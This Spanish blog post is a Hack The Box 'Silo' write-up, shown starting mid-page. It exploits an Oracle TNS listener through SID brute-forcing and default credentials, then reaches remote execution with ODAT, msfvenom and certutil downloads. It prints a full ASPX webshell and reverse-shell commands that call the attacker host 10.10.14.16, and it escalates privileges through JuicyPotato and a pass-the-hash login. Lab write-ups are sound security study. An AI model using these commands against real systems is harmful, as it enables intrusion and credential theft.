Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 127.10 seconds
</code></pre></div><h1 id=enumeración>Enumeración<a hidden class=anchor aria-hidden=true href=#enumeración>#</a></h1>
<h2 id=servicios>Servicios<a hidden class=anchor aria-hidden=true href=#servicios>#</a></h2>
<h3 id=microsoft-iis---80>Microsoft IIS - 80<a hidden class=anchor aria-hidden=true href=#microsoft-iis---80>#</a></h3>
<p>Se expone la página por default de Microsoft IIS y al hacer uso de herramientas de fuzzing no se tuvo éxito al buscar algún directorio relevante, sin embargo, para el método intencionado de resolución es importante tener a consideración.</p>
<p><img loading=lazy src=/images/posts/htb-silo/enum_1.png alt="Página default IIS">
</p>
<h3 id=oracle-tns-listener---1521>Oracle TNS Listener - 1521<a hidden class=anchor aria-hidden=true href=#oracle-tns-listener---1521>#</a></h3>
<p>Después de revisar acerca de la <a href=https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener>metodología empleada</a> para este servicio, se buscó obtener información relevante respecto la versión, estatus, etc, haciendo uso de <code>tnscmd10g</code> sin éxito alguno.</p>
<p>Posteriormente, en la metodología se mencionan los SID (Identificadores de Servicio, esencialmente pueden ser reconocidos como los nombres de las bases de datos), los cuales dependiendo de la instalación realizada pueden existir uno o más SIDs por defecto. Al no poder obtenerlos mediante <code>tnscmd10g</code>, se sugiere que realice fuerza bruta de los comúnes para identificar los existentes.</p>
<h4 id=hydra>hydra<a hidden class=anchor aria-hidden=true href=#hydra>#</a></h4>
<p>Haciendo uso de <code>hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid</code> con el conjunto de diccionarios que ofrece <a href=https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener#what-is-a-sid>hacktricks</a> (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:</p>
<ul>
<li>CLRExtProc.</li>
<li>PLSExtProc.</li>
<li>XE.</li>
</ul>
<p><img loading=lazy src=/images/posts/htb-silo/enum_2.png alt="Fuerza bruta de SIDs">
</p>
<h1 id=explotación>Explotación<a hidden class=anchor aria-hidden=true href=#explotación>#</a></h1>
<p><em>Nota: Después de resolver la máquina se suele verificar el proceso con otras fuentes, identificando de esta manera que existen 2 caminos a resolver la máquina una intencionada y una no intencionada, una más directa por no decir fácil que la otra. Primero se expondrá el método por el cuál se resolvió inicialmente y posteriormente la resolución intencionada.</em></p>
<h2 id=no-intencionada>No intencionada<a hidden class=anchor aria-hidden=true href=#no-intencionada>#</a></h2>
<h3 id=obtención-de-credenciales>Obtención de credenciales<a hidden class=anchor aria-hidden=true href=#obtención-de-credenciales>#</a></h3>
<h4 id=pasos-previos--preparación>Pasos previos | Preparación<a hidden class=anchor aria-hidden=true href=#pasos-previos--preparación>#</a></h4>
<p>Haciendo uso de <a href=https://github.com/quentinhardy/odat>ODAT</a> se obtuvieron credenciales de un usuario disponible, por medio de un módulo que la herramienta ofrece. Inicialmente se requiere la instalación descrita en el repositorio aunque por lo que respecta en kali, basta con clonar el repositorio.</p>
<h4 id=ejecución>Ejecución<a hidden class=anchor aria-hidden=true href=#ejecución>#</a></h4>
<p>Como parte inicial se ejecutó un &ldquo;Ave María&rdquo; invocando todos los módulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID válido a ocupar, siendo <code>XE</code> el SID con información útil (identificándolo después de ejecutar el comando con cada uno de los SIDs). Haciendo uso de <code>./odat.py all -s 10.10.10.82 -p 1521 -d XE</code>.</p>
<p><img loading=lazy src=/images/posts/htb-silo/exploit_1.png alt="Obtención de credenciales">
</p>
<p>Posteriormente se identificó que el módulo encargado de hacer este proceso es <code>passwordguesser</code> el cual simplemente sustituiría a <code>all</code> del comando.</p>
<h3 id=rce>RCE<a hidden class=anchor aria-hidden=true href=#rce>#</a></h3>
<h4 id=pasos-previos--preparación-1>Pasos previos | Preparación<a hidden class=anchor aria-hidden=true href=#pasos-previos--preparación-1>#</a></h4>
<p>Posteriormente, al revisar los módulos disponibles se identificó que tanto el módulo <code>dbmsscheduler</code> como el módulo <code>externaltable</code> ofrecen capacidad de ejecutar comandos. Que al intentar usarlos no se permitió su ejecución debido a la falta de privilegios, sin embargo, se encontró que mediante la bandera <code>--sysdba</code> existe la posibilidad de &ldquo;escalar&rdquo; estos privilegios o impersonar un rol superior al que se tenía.</p>
<h4 id=ejecución-1>Ejecución<a hidden class=anchor aria-hidden=true href=#ejecución-1>#</a></h4>
<p>Obteniendo así, una vez ejecutada la reverse shell, acceso directamente como administrador.</p>
<ol>
<li>Creando un payload con <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe > pwn.exe</code>.</li>
<li>Descargándolo con <code>./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec "certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\windows\temp\pwn.exe" --sysdba</code>.</li>
<li>Y ejecutándolo con <code>./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec "c:\windows\temp" "pwn.exe" --sysdba</code>.</li>
</ol>
<p><img loading=lazy src=/images/posts/htb-silo/exploit_2.png alt="Reverse shell">
</p>
<h2 id=intencionada>Intencionada<a hidden class=anchor aria-hidden=true href=#intencionada>#</a></h2>
<p>Si bien odat permite la lectura, escritura y ejecución de archivos, todo lo que realiza en estos procesos no resulta tan &ldquo;transparente&rdquo; por lo que para entender un poco acerca de Oracle se realizo parte del mismo proceso por medio de SQL directamente.</p>
<p><em>Nota: Se da por hecho que se realizo el descubrimiento de los SIDs y de las credenciales válidas, dado que <code>scott:tiger</code> son credenciales por default.</em></p>
<h3 id=rce-1>RCE<a hidden class=anchor aria-hidden=true href=#rce-1>#</a></h3>
<h4 id=pasos-previos--preparación-2>Pasos previos | Preparación<a hidden class=anchor aria-hidden=true href=#pasos-previos--preparación-2>#</a></h4>
<p>Como parte de la <a href=https://github.com/quentinhardy/odat#installation-optional-for-development-version>instalación de odat</a>, se realiza la instalación del cliente sql para conectarse a la base de datos de Oracle.</p>
<p>Por lo que una vez instalado se permite la conexión al host por medio de <code>sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba</code>.</p>
<p><img loading=lazy src=/images/posts/htb-silo/exploit_3.png alt="Conexión con cliente Oracle">
</p>
<h4 id=ejecución-2>Ejecución<a hidden class=anchor aria-hidden=true href=#ejecución-2>#</a></h4>
<p>Oracle ocupa su propia sintaxis por lo que con el siguiente pedazo de código se buscó obtener el contenido del archivo por defecto del servidor. Buscando obtener respuesta por medio del prompt configurando primeramente <code>set serveroutput ON</code> para su visualización.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>declare</span>
    f utl_file.file_type;
    s varchar(<span style=color:#ae81ff>200</span>);
<span style=color:#66d9ef>begin</span>
    f :<span style=color:#f92672>=</span> utl_file.fopen(<span style=color:#e6db74>&#39;/inetpub/wwwroot&#39;</span>, <span style=color:#e6db74>&#39;iisstart.htm&#39;</span>, <span style=color:#e6db74>&#39;R&#39;</span>);
    utl_file.get_line(f,s);
    utl_file.fclose(f);
    dbms_output.put_line(s);
<span style=color:#66d9ef>end</span>;
</code></pre></div><p><img loading=lazy src=/images/posts/htb-silo/exploit_4.png alt="Lectura de archivos">
</p>
<p>Por otra parte se puede verificar que también exista la capacidad de escribir a un archivo, verificándolo con el siguiente segmento de código.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>declare</span>
    f utl_file.file_type;
    s varchar(<span style=color:#ae81ff>5000</span>) :<span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Hello world&#39;</span>;
<span style=color:#66d9ef>begin</span>
    f :<span style=color:#f92672>=</span> utl_file.fopen(<span style=color:#e6db74>&#39;/inetpub/wwwroot&#39;</span>, <span style=color:#e6db74>&#39;srrequiem.txt&#39;</span>, <span style=color:#e6db74>&#39;W&#39;</span>);
    utl_file.put_line(f,s);
    utl_file.fclose(f);
<span style=color:#66d9ef>end</span>;
</code></pre></div><p><img loading=lazy src=/images/posts/htb-silo/exploit_5.png alt="Escritura de archivos">
</p>
<p><img loading=lazy src=/images/posts/htb-silo/exploit_6.png alt="Visualización en IIS">
</p>
<p>Una vez validada la escritura, se abre la puerta a la creación de una reverse shell, el inconveniente es que debido al espacio limitado en las variables respecto a los caracteres no fue posible llevarlo a cabo, por lo que se optó por una webshell en su lugar.</p>
<p>Utilizando <code>/usr/share/webshells/aspx/cmdasp.aspx</code> eliminando estilos, comentarios y saltos de línea para reducir los caracteres se obtuvo ejecución en la máquina.</p>
<p>Código de página empleado:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c# data-lang=c#>&lt;%<span style=color:#960050;background-color:#1e0010>@</span> Page Language=<span style=color:#e6db74>&#34;C#&#34;</span> Debug=<span style=color:#e6db74>&#34;true&#34;</span> Trace=<span style=color:#e6db74>&#34;false&#34;</span> %&gt;&lt;%<span style=color:#960050;background-color:#1e0010>@</span> Import Namespace=<span style=color:#e6db74>&#34;System.Diagnostics&#34;</span> %&gt;&lt;%<span style=color:#960050;background-color:#1e0010>@</span> Import Namespace=<span style=color:#e6db74>&#34;System.IO&#34;</span> %&gt;&lt;script Language=<span style=color:#e6db74>&#34;c#&#34;</span> runat=<span style=color:#e6db74>&#34;server&#34;</span>&gt;<span style=color:#66d9ef>void</span> Page_Load(<span style=color:#66d9ef>object</span> sender, EventArgs e){}<span style=color:#66d9ef>string</span> ExcuteCmd(<span style=color:#66d9ef>string</span> arg){ProcessStartInfo psi = <span style=color:#66d9ef>new</span> ProcessStartInfo();psi.FileName = <span style=color:#e6db74>&#34;cmd.exe&#34;</span>;psi.Arguments = <span style=color:#e6db74>&#34;/c &#34;</span>+arg;psi.RedirectStandardOutput = <span style=color:#66d9ef>true</span>;psi.UseShellExecute = <span style=color:#66d9ef>false</span>;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;<span style=color:#66d9ef>string</span> s = stmrdr.ReadToEnd();stmrdr.Close();<span style=color:#66d9ef>return</span> s;}<span style=color:#66d9ef>void</span> cmdExe_Click(<span style=color:#66d9ef>object</span> sender, System.EventArgs e){Response.Write(<span style=color:#e6db74>&#34;&lt;pre&gt;&#34;</span>);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(<span style=color:#e6db74>&#34;&lt;/pre&gt;&#34;</span>);}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=<span style=color:#e6db74>&#34;cmd&#34;</span> method=<span style=color:#e6db74>&#34;post&#34;</span> runat=<span style=color:#e6db74>&#34;server&#34;</span>&gt;&lt;asp:TextBox id=<span style=color:#e6db74>&#34;txtArg&#34;</span> runat=<span style=color:#e6db74>&#34;server&#34;</span> Width=<span style=color:#e6db74>&#34;250px&#34;</span>&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=<span style=color:#e6db74>&#34;testing&#34;</span> runat=<span style=color:#e6db74>&#34;server&#34;</span> Text=<span style=color:#e6db74>&#34;excute&#34;</span> OnClick=<span style=color:#e6db74>&#34;cmdExe_Click&#34;</span>&gt;&lt;/asp:Button&gt;&lt;asp:Label id=<span style=color:#e6db74>&#34;lblText&#34;</span> runat=<span style=color:#e6db74>&#34;server&#34;</span>&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;
</code></pre></div><p><img loading=lazy src=/images/posts/htb-silo/exploit_7.png alt="Webshell en aspx">
</p>
<h1 id=post-explotación>Post Explotación<a hidden class=anchor aria-hidden=true href=#post-explotación>#</a></h1>
<h2 id=enumeración-1>Enumeración<a hidden class=anchor aria-hidden=true href=#enumeración-1>#</a></h2>
<p>Se identificó que entre los privilegios disponibles del usuario obtenido se encuentra habilitado <code>SeImpersonatePrivilege</code> lo que lleva a un camino de escalación de privilegios por medio de Rotten o JuicyPotato.</p>
<p><img loading=lazy src=/images/posts/htb-silo/post_1.png alt="Privilegios de usuario">
</p>
<p>Se identificó un archivo accesible en el escritorio de uno de los usuarios del sistema <code>c:\users\phineas\desktop\oracle issue.txt</code> el cual indica que se trata de un dumpeo de memoria del sistema.</p>
<p>Contenido:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt>Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
£%Hm8646uC$
</code></pre></div><p><em>Nota: Cabe recalcar que el caracter <code>£</code> puede que no se interprete correctamente si se optó por entablar una reverse shell, causando su omisión y por consiguiente, que a la hora de la descarga indique que la contraseña no es válida. Teniendo que realizar un procesado extra (ejemplo base64) para extraer su contenido. Accediendo al archivo por medio de la webshell no existió este problema</em></p>
<p><img loading=lazy src=/images/posts/htb-silo/post_2.png alt="Problema de interpretación de caracteres">
</p>
<h2 id=escalación-de-privilegios>Escalación de privilegios<a hidden class=anchor aria-hidden=true href=#escalación-de-privilegios>#</a></h2>
<h3 id=método-1---juicy-potato>Método 1 - Juicy Potato<a hidden class=anchor aria-hidden=true href=#método-1---juicy-potato>#</a></h3>
<p>Habiendo encontrado los privilegios relacionados con este método de escalación, sólo restaría probar su ejecución mediante el <a href=https://github.com/ohpe/juicy-potato/releases>binario</a> y con las opciones utilizadas para entablar una reverse shell con permisos elevados <code>NT AUTHORITY\SYSTEM</code>.</p>
<p><code>.\jp.exe -t * -l 1337 -p c:\windows\temp\nc.exe -a " -e cmd.exe 10.10.14.16 4321"</code></p>
<p><img loading=lazy src=/images/posts/htb-silo/post_3.png alt="Ejecución de Juicy Potato">
</p>
<p>Con lo que respecta a los argumentos utilizados, el binario mismo da la descripción de cada uno de ellos.</p>
<p><img loading=lazy src=/images/posts/htb-silo/post_4.png alt="Descripción de argumentos">
</p>
<p>Con lo que respecta a la práctica los argumentos <code>-t</code> y <code>-l</code> no representa algo sustancial el cambiar valores. Y en donde <code>-p</code> (programa a ejecutar) y <code>-a</code> (argumentos a utilizar por el programa señalado) se usaron a partir de las herramientas usadas en pasos anteriores.</p>
<h3 id=método-2---memdump>Método 2 - Memdump<a hidden class=anchor aria-hidden=true href=#método-2---memdump>#</a></h3>
<p>Con la copia de memoria descargada, se puede hacer uso de <a href=https://www.volatilityfoundation.org/releases>volatility</a> para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de <code>./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo</code> teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil más adecuado.</p>
<p><img loading=lazy src=/images/posts/htb-silo/post_5.png alt="Perfiles sugeridos">
</p>
<p>Ejecutando <code>systeminfo</code> en la máquina se pueden comparar resultados, identificando el perfil <code>Win2012R2x64</code> como el más adecuado.</p>
<p><img loading=lazy src=/images/posts/htb-silo/post_6.png alt="Información de sistema">
</p>
<p>Haciendo uso del plugin <code>hashdump</code> se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la máquina como el usuario Administrator. Por medio de <code>./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump</code>.</p>
<p><img loading=lazy src=/images/posts/htb-silo/post_7.png alt="Obtención de hashes">
</p>
<p>Obteniendo acceso haciendo uso del hash con <code>impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7</code>.</p>
<p><img loading=lazy src=/images/posts/htb-silo/post_8.png alt="Acceso como Administrator">
</p>
<h1 id=referencias>Referencias<a hidden class=anchor aria-hidden=true href=#referencias>#</a></h1>
<ul>
<li><a href=https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener>Hack Tricks - Pentesting Oracle TNS Listener</a>.</li>
<li><a href=https://github.com/quentinhardy/odat>odat.py</a>.</li>
<li><a href=https://0xdf.gitlab.io/2018/08/04/htb-silo.html>0xdf Write-up</a>.</li>
<li><a href="https://www.youtube.com/watch?v=2c7SzNo9uoA">Ippsec Walkthrough</a>.</li>
<li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges>PayloadAllTheThings - JuicyPotato</a>.</li>
<li><a href=https://github.com/ohpe/juicy-potato/releases>Binarios Juicy Potato</a>.</li>
<li><a href=https://www.volatilityfoundation.org/releases>Releases Volatility</a>.</li>
<li><a href=https://github.com/volatilityfoundation/volatility>Github Volatility</a>.</li>
</ul>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://rzul.me/tags/htb-medium/>HTB - Medium</a></li>
<li><a href=https://rzul.me/tags/microsoft-iis/>Microsoft IIS</a></li>
<li><a href=https://rzul.me/tags/oracle-tns-listener/>Oracle TNS Listener</a></li>
<li><a href=https://rzul.me/tags/oracle-bd/>Oracle BD</a></li>
<li><a href=https://rzul.me/tags/odat/>ODAT</a></li>
<li><a href=https://rzul.me/tags/sqlplus/>sqlplus</a></li>
<li><a href=https://rzul.me/tags/forensics/>forensics</a></li>
<li><a href=https://rzul.me/tags/juicy-potato/>Juicy Potato</a></li>
<li><a href=https://rzul.me/tags/volatility/>volatility</a></li>
</ul>
<nav class=paginav>
<a class=next href=https://rzul.me/posts/htb-cyber-apocalypse-2022/>
<span class=title>Siguiente »</span>
<br>
<span>HTB Cyber Apocalypse 2022</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Silo on twitter" href="https://twitter.com/intent/tweet/?text=Hack%20The%20Box%20-%20Silo&url=https%3a%2f%2frzul.me%2fposts%2fhtb-silo%2f&hashtags=HTB-Medium%2cMicrosoftIIS%2cOracleTNSListener%2cOracleBD%2cODAT%2csqlplus%2cforensics%2cJuicyPotato%2cvolatility"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Silo on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2frzul.me%2fposts%2fhtb-silo%2f&title=Hack%20The%20Box%20-%20Silo&summary=Hack%20The%20Box%20-%20Silo&source=https%3a%2f%2frzul.me%2fposts%2fhtb-silo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Silo on reddit" href="https://reddit.com/submit?url=https%3a%2f%2frzul.me%2fposts%2fhtb-silo%2f&title=Hack%20The%20Box%20-%20Silo"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Silo on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frzul.me%2fposts%2fhtb-silo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Silo on whatsapp" href="https://api.whatsapp.com/send?text=Hack%20The%20Box%20-%20Silo%20-%20https%3a%2f%2frzul.me%2fposts%2fhtb-silo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Silo on telegram" href="https://telegram.me/share/url?text=Hack%20The%20Box%20-%20Silo&url=https%3a%2f%2frzul.me%2fposts%2fhtb-silo%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2022 <a href=https://rzul.me/>Román Zuleta</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>